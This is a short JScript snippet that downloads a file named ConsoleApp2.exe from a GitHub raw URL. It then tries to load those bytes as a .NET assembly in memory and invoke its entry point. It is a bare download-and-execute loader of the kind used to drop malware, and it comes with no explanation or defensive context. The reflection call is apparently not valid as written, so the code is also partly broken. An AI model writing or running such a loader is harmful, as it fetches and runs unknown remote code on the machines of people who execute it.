var x = new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET", "https://raw.githubusercontent.com/andrevital771-debug/Loucura/main/ConsoleApp2.exe", false);
x.send();

var bytes = x.responseBody;
var assembly = new ActiveXObject("System.Reflection.Assembly");
var loaded = assembly.Load(bytes);
loaded.GetEntryPoint().Invoke(null, null);
